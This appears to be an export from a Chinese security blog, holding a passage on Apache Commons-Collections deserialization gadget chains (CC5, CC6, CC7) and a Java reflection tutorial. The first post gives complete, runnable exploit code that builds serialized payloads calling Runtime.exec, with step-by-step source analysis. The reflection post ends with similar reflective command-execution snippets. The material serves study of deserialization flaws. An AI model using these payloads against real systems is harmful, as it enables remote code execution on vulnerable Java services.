13 14 15 16 17 18 19 protected static class MutableInteger { protected int value; MutableInteger(int value) { this.value = value; } public boolean equals(Object obj) { if (!(obj instanceof MutableInteger)) { return false; } else { return ((MutableInteger)obj).value == this.value; } } public int hashCode() { return this.value; } } 这就很难搞了，因为我们无法从外部获取到MutableInteger。\n因此我认为很难再使用TreeBag\u0026amp;TreeMap构造了。\nCommonsCollections5 版本适用范围 Commons-Collections 3.1-3.2.1\njdk without a security manager\nExp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; public class CommonsCollections5 { public static void main(String[] args) throws Exception { Transformer Testtransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,Testtransformer); TiedMapEntry tiedmap = new TiedMapEntry(map,123); BadAttributeValueExpException poc = new BadAttributeValueExpException(123); Field val = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;).getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(poc,tiedmap); Field field = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(Testtransformer, transformers); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;cc5.out\u0026#34;)); outputStream.writeObject(poc); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;cc5.out\u0026#34;)); inputStream.readObject(); } } Exp构造分析 利用链展示 1 2 3 4 5 6 7 8 9 10 Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Runtime.exec() BadAttributeValueExpException 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString();//1 } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } 分析一下BadAttributeValueExpException.readObject()源码，因为SecurityManager是默认关闭的，因此System.getSecurityManager() == null​为真，程序会执行注释1处。\n分析Exp，这里会触发TiedMapEntry.toString()。\nTiedMapEntry 1 2 3 4 5 6 7 public String toString() { return this.getKey() + \u0026#34;=\u0026#34; + this.getValue(); } public Object getValue() { return this.map.get(this.key);//1 } 程序在注释1处会触发LazyMap.get()，后续的执行流程则和CommonsCollections1相同。\nCommonsCollections6 版本适用范围 commons-collections : 3.1～3.2.1\nExp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer Testtransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,Testtransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\u0026#34;cc6\u0026#34;); HashSet hashSet=new HashSet(1); hashSet.add(tiedMapEntry); lazyMap.remove(\u0026#34;cc6\u0026#34;); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field field = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(Testtransformer, transformers); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;cc6.out\u0026#34;)); objectOutputStream.writeObject(hashSet); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;cc6.out\u0026#34;)); objectInputStream.readObject(); } } Exp构造分析 利用链展示 1 2 3 4 5 6 7 HashSet.readObject()/HashMap.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() HashSet 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal capacity: \u0026#34; + capacity); } // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) { throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); } // Read size and verify non-negative. int size = s.readInt(); if (size \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal size: \u0026#34; + size); } // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Constructing the backing map will lazily create an array when the first element is // added, so check it before construction. Call HashMap.tableSizeFor to compute the // actual allocation size. Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what is actually created. SharedSecrets.getJavaOISAccess() .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity)); // Create backing HashMap map = (((HashSet\u0026lt;?\u0026gt;)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) s.readObject(); map.put(e, PRESENT);//1 } } 程序在反序列化时，在注释1处，执行HashMap.put()\nHashMap 1 2 3 4 5 6 7 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16);//1 } 程序在注释1处执行TiedMapEntry.hashCode()\nTiedMapEntry 1 2 3 4 5 6 7 public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } public Object getValue() { return this.map.get(this.key);//1 } 程序在注释1处触发LazyMap.get()。\nLazyMap 1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key);//1 super.map.put(key, value); return value; } else { return super.map.get(key); } } 程序在注释1处会执行我们恶意构造的payload。\n问题补充 lazyMap.remove(\u0026ldquo;cc6\u0026rdquo;) Q1：\n为何要把cc6删除掉\nA1：\n主要和LazyMap有关\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) {//1 Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key);//2 } } 如果不删除则会执行注释2，这样就触发不了payload。\nQ2：\ncc6这个值是在哪里赋值给lazyMap的呢？\nA2：\n在hashSet.add(tiedMapEntry)，这个过程和Exp利用链基本一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //HashSet public boolean add(E e) { return map.put(e, PRESENT)==null; } //HashMap public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } //.......和Exp利用链相同 //ChainedTransformer public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object;//1 } 因为Transformer Testtransformer = new ChainedTransformer(new Transformer[]{})​，所以注释1处返回cc6。\n因此lazyMap有一个键值对\u0026quot;cc6\u0026quot;-\u0026gt;\u0026ldquo;cc6\u0026rdquo;。\nTesttransformer Q：\n为何要先用Testtransformer​构造，再用反射更改iTransformers​。\nA：\n否则会在反序列化之前触发payload，导致程序中止。\nCommonsCollections7 版本适用范围 commons-collections : 3.1～3.2.1\nExp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\u0026#34;cc7\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tiedMapEntry, \u0026#34;cc7\u0026#34;); lazyMap.remove(\u0026#34;cc7\u0026#34;); Field iTransformers = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); iTransformers.setAccessible(true); iTransformers.set(chainedTransformer,transformers); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;cc7.out\u0026#34;)); objectOutputStream.writeObject(hashtable); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;cc7.out\u0026#34;)); objectInputStream.readObject(); } } Exp构造分析 利用链展示 1 2 3 4 5 Hashtable.readObject()/Hashtable.reconstitutionPut() TiedMapEntry.hashCode()/TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() Hashtable 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 private void reconstitutionPut(Entry\u0026lt;?,?\u0026gt;[] tab, K key, V value) throws StreamCorruptedException { if (value == null) { throw new java.io.StreamCorruptedException(); } // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = key.hashCode();//2 int index = (hash \u0026amp; 0x7FFFFFFF) % tab.length; for (Entry\u0026lt;?,?\u0026gt; e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026amp;\u0026amp; e.key.equals(key)) { throw new java.io.StreamCorruptedException(); } } // Creates the new entry. @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Entry\u0026lt;K,V\u0026gt; e = (Entry\u0026lt;K,V\u0026gt;)tab[index]; tab[index] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); count++; } private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold and loadFactor s.defaultReadObject(); // Validate loadFactor (ignore threshold - it will be re-computed) if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new StreamCorruptedException(\u0026#34;Illegal Load: \u0026#34; + loadFactor); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Validate # of elements if (elements \u0026lt; 0) throw new StreamCorruptedException(\u0026#34;Illegal # of Elements: \u0026#34; + elements); // Clamp original length to be more than elements / loadFactor // (this is the invariant enforced with auto-growth) origlength = Math.max(origlength, (int)(elements / loadFactor) + 1); // Compute new length with a bit of room 5% + 3 to grow but // no larger than the clamped original length. Make the length // odd if it\u0026#39;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that\u0026#39;s not valid. int length = (int)((elements + elements / 20) / loadFactor) + 3; if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; length = Math.min(length, origlength); if (length \u0026lt; 0) { // overflow length = origlength; } // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length); table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); //1 } } CommonsCollections7和6的区别主要是使用了Hashtable，代码关键在于注释1和2处。\n","date":"2024-09-04T01:24:26+08:00","image":"https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123190803.jpg","permalink":"https://lantern-lab.github.io/post/java-derivativeization-zj7e3h.html","title":"【Java反序列化】CommonsCollections链"},{"content":"Java反射 参考文章：\nJAVA反序列化 - 反射机制\nJava反射（超详细！）\nJava反射（简单详细且易懂，快速入门）\n0 准备一个User类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package org.example.reflect; public class User { public String name; private int age; public User(){} private User(String name){ this.name = name; } public User(String name, int age){ this.name = name; this.age = age; } private void testPrivate(String name, int age){ System.out.println(\u0026#34;这是一个用来测试的私有方法。User [name=\\\u0026#34;+ name +\\\u0026#34;, age=\\\u0026#34;+age+\\\u0026#34;]\u0026#34;); } public void testPublic(String name, int age) { System.out.println(\u0026#34;这是一个用来测试的公有方法。User [name=\\\u0026#34;+ name +\\\u0026#34;, age=\\\u0026#34;+age+\\\u0026#34;]\u0026#34;); } public String toString(){ return \u0026#34;User [name=\u0026#34;+ name +\u0026#34;, age=\u0026#34;+age+\u0026#34;]\u0026#34;; } } 1 反射相关类 类 含义 java.lang.Class 代表整个字节码；代表一个类型，代表整个类 java.lang.reflect.Constructor 代表字节码中的构造方法字节码；代表类中的构造方法 java.lang.reflect.Field 代表字节码中的属性字节码；代表类中的成员变量（静态变量+实例变量） java.lang.reflect.Method 代表字节码中的方法字节码；代表类中的方法 通常是先获取Class类，再通过Class类的方法获取Method类、Constructor类或Field类\n2 获取Class类 Class.forName(\u0026ldquo;类的静态路径\u0026rdquo;) 类名.Class 对象名.getClass() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example.reflect; public class ReflectTest01 { public static void main(String[] args) throws InstantiationException, IllegalAccessException, ClassNotFoundException { Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;org.example.reflect.User\u0026#34;); //如果无参构造函数是private,则无法使用newInstance方法 //Object o1 = c1.newInstance(); System.out.println(c1.getName()); Class\u0026lt;?\u0026gt; c2 = User.class; //Object o2 = c2.newInstance(); System.out.println(c2.getName()); User user = new User(\u0026#34;zhangsan\u0026#34;,18); Class\u0026lt;? extends User\u0026gt; c3 = user.getClass(); Object o3 = c3.newInstance(); System.out.println(o3); } } 获取到Class类后，可以通过如下方法获取对应的构造函数、成员方法或者成员变量才进行其它操作\n通过Class获取Constructor 方法 含义 public Constructor getConstructor(Class\u003c?\u003e\u0026hellip; parameterTypes) 获取公开的构造方法 public Constructor\u003c?\u003e[] getConstructors() 获取所有的公开的构造方法 public Constructor getDeclaredConstructor(Class\u003c?\u003e\u0026hellip; parameterTypes) 获取指定包括私有,不包括继承的Constructor对象 public Constructor\u003c?\u003e[] getDeclaredConstructors() 获取所有的构造方法,包括私有 通过Class获取Field 方法 含义 public Field getField(String name) 获取指定公共属性的Field对象 public Field[] getFields() 获取所有公开的成员变量,包括继承变量 public Field getDeclaredField(String name) 获取指定包括私有,不包括继承的Field对象 public Field[] getDeclaredFields() 获取本类定义的成员变量,包括私有,但不包括继承的变量 通过Class获取Method 方法 含义 public Method getMethod(String name, Class\u003c?\u003e\u0026hellip; parameterTypes) 获取指定方法的Method对象 public Method[] getMethods() 获取所有可见的方法,包括继承的方法 public Method getDeclaredMethod(String name, Class\u003c?\u003e\u0026hellip; parameterTypes) 获取指定包括私有,不包括继承的Method对象 public Method[] getDeclaredMethods() 获取本类定义的的方法,包括私有,不包括继承的方法 3 获取Constructor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example.reflect; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; public class ReflectTest02 { public static void main(String[] args) { Class\u0026lt;?\u0026gt; userClass = User.class; //测试getConstructors()函数 Constructor\u0026lt;?\u0026gt;[] constructors = userClass.getConstructors(); System.out.println(\u0026#34;\\n通过getConstructors()获取所有公开构造方法\u0026#34;); for (Constructor\u0026lt;?\u0026gt; con : constructors) { System.out.println(\u0026#34;构造方法名称为：\u0026#34; + con.getName()); Class\u0026lt;?\u0026gt;[] paramList = con.getParameterTypes(); System.out.println(\u0026#34;参数数量为：\u0026#34; + paramList.length); System.out.println(\u0026#34;形参类型为：\u0026#34;); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(p); } } System.out.println();//换行 //测试getDeclaredConstructors()函数 Constructor\u0026lt;?\u0026gt;[] DeclaredConstructors = userClass.getDeclaredConstructors(); System.out.println(\u0026#34;\\n通过getDeclaredConstructors()获取所有构造方法(包括私有,包括继承)\u0026#34;); for (Constructor\u0026lt;?\u0026gt; con : DeclaredConstructors) { System.out.println(\u0026#34;构造方法名称为：\u0026#34; + con.getName()); Class\u0026lt;?\u0026gt;[] paramList = con.getParameterTypes(); System.out.println(\u0026#34;参数数量为：\u0026#34; + paramList.length); System.out.println(\u0026#34;形参类型为：\u0026#34;); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(p); } } //测试getConstructor()函数 try { Constructor\u0026lt;?\u0026gt; constructor = userClass.getConstructor(String.class, int.class); Object o = constructor.newInstance(\u0026#34;Alice\u0026#34;,18); System.out.println(\u0026#34;\\n构造的对象为：\u0026#34; + o); } catch (NoSuchMethodException | InvocationTargetException | InstantiationException | IllegalAccessException e) { throw new RuntimeException(e); } } } 4 获取Field ‍\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example.reflect; import java.lang.reflect.Field; public class ReflectTest03 { public static void main(String[] args) throws InstantiationException, IllegalAccessException { Class\u0026lt;User\u0026gt; userClass = User.class; Object o = userClass.newInstance(); //测试getFields()函数 Field []studentFields = userClass.getFields(); System.out.println(\u0026#34;\\n通过getFields获取Student类所有公开属性\u0026#34;); for (Field field:studentFields) { System.out.println(\u0026#34;属性的类型为：\u0026#34;+field.getType()+\u0026#34;属性的名称为：\u0026#34;+field.getName()); } //测试getDeclaredFields()函数 Field []studentDeclaredFields = userClass.getDeclaredFields(); System.out.println(\u0026#34;\\n通过getDeclaredFields获取Student类所有属性(包括私有,不包括继承)\u0026#34;); for (Field field :studentDeclaredFields) { System.out.println(\u0026#34;属性的类型为：\u0026#34;+field.getType()+\u0026#34;\\t属性的名称为：\u0026#34;+field.getName()); } //测试getField(String)函数 try { Field field = userClass.getField(\u0026#34;name\u0026#34;); System.out.println(\u0026#34;\\n通过getField(\\\u0026#34;name\\\u0026#34;)获取公开属性name\u0026#34;); System.out.println(\u0026#34;属性的类型为：\u0026#34;+field.getType()+\u0026#34;\\t属性的名称为：\u0026#34;+field.getName()); field.set(o,\u0026#34;Bob\u0026#34;); System.out.println(o); } catch (NoSuchFieldException e) { throw new RuntimeException(e); } //测试getDeclaredField(String)函数 try { Field declaredFiled = userClass.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(\u0026#34;\\n通过getDeclaredField(\\\u0026#34;age\\\u0026#34;)获取私有属性age\u0026#34;); System.out.println(\u0026#34;属性的类型为：\u0026#34;+declaredFiled.getType()+\u0026#34;\\t属性的名称为：\u0026#34;+declaredFiled.getName()); declaredFiled.setAccessible(true);//为了可以访问私有成员变量，我们需要强制设置访问权限。 declaredFiled.set(o, 18); System.out.println(declaredFiled.get(o)); } catch (NoSuchFieldException e) { throw new RuntimeException(e); } } } 5 获取Method 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package org.example.reflect; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ReflectTest04 { public static void main(String[] args) throws NoSuchMethodException, InstantiationException, IllegalAccessException { Class\u0026lt;User\u0026gt; userClass = User.class; Object o = userClass.newInstance(); //测试getMethods()函数 Method[] methods = userClass.getMethods(); System.out.println(\u0026#34;\\n通过getMethods()获取所有公开方法\u0026#34;); for (Method method : methods) { System.out.println(method.getName()); Class\u0026lt;?\u0026gt;[] paramList = method.getParameterTypes(); System.out.println(\u0026#34;参数数量为：\u0026#34; + paramList.length); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(\u0026#34;参数类型为:\u0026#34; + p.getTypeName()); } } //测试getDeclaredMethods()函数 Method[] declaredMethods = userClass.getDeclaredMethods(); System.out.println(\u0026#34;\\n通过getdeclaredMethods()获取所有方法(包括私有,不包括继承)\u0026#34;); for (Method method : declaredMethods) { System.out.println(method.getName()); Class\u0026lt;?\u0026gt;[] paramList = method.getParameterTypes(); System.out.println(\u0026#34;参数数量为：\u0026#34; + paramList.length); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(\u0026#34;参数类型为:\u0026#34; + p.getTypeName()); } } //测试getMethod(参数)函数 Method method = userClass.getMethod(\u0026#34;testPublic\u0026#34;, String.class, int.class); System.out.println(\u0026#34;\\n通过getMethod获取testPublic\u0026#34;); System.out.println(method.getName()); try { method.invoke(o, \u0026#34;Alice\u0026#34;, 18); } catch (InvocationTargetException e) { throw new RuntimeException(e); } Class\u0026lt;?\u0026gt;[] paramList = method.getParameterTypes(); System.out.println(\u0026#34;参数数量为：\u0026#34; + paramList.length); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(\u0026#34;参数类型为:\u0026#34; + p.getTypeName()); } //测试getDeclaredMethod(参数)函数 Method declaredMethod = userClass.getDeclaredMethod(\u0026#34;testPrivate\u0026#34;, String.class, int.class); System.out.println(\u0026#34;\\n通过getDeclaredMethod获取testPrivate方法\u0026#34;); System.out.println(declaredMethod.getName()); try { declaredMethod.setAccessible(true); declaredMethod.invoke(o, \u0026#34;Bob\u0026#34;, 20); } catch (InvocationTargetException e) { throw new RuntimeException(e); } Class\u0026lt;?\u0026gt;[] pls = declaredMethod.getParameterTypes(); System.out.println(\u0026#34;参数数量为：\u0026#34; + pls.length); for (Class\u0026lt;?\u0026gt; p : pls) { System.out.println(\u0026#34;参数类型为:\u0026#34; + p.getTypeName()); } } } 6 例子 例一 ​Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);​\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(Class.forName(\u0026#34;java.lang.Runtime\u0026#34;))//此处在获取类 , \u0026#34;calc.exe\u0026#34; ); ​public Object invoke(Object obj, Object... args)​\n它的第一个参数是执行method的对象：\n如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 例二 1 2 3 4 List\u0026lt;String\u0026gt; paramList = new ArrayList\u0026lt;\u0026gt;(); paramList.add(\u0026#34;calc.exe\u0026#34;); ProcessBuilder pb = new ProcessBuilder(paramList); pb.start(); ProcessBuilder有两个构造函数\n​public ProcessBuilder(List\u0026lt;String\u0026gt; command)​ ​public ProcessBuilder(String... command)​ 根据这两个构造函数，有两个反序列化的构造\n1 2 3 4 5 6 7 Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;) .getMethod(\u0026#34;start\u0026#34;) .invoke( Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;) .getConstructor(List.class) .newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;)) ); 1 2 3 4 ((ProcessBuilder)Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;) .getConstructor(String[].class) .newInstance(new String[][]{{\u0026#34;calc.exe\u0026#34;}})) .start(); newInstance函数接受参数是一个Object..​也就是Object数组，它会给String[][]去掉一层。剩下的String[]匹配ProcessBuilder变量格式。\n","date":"2024-07-18T10:32:05+08:00","image":"https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123185908.jpg","permalink":"https://lantern-lab.github.io/post/java-reflection-1ypwc3.html","title":"Java反射"}]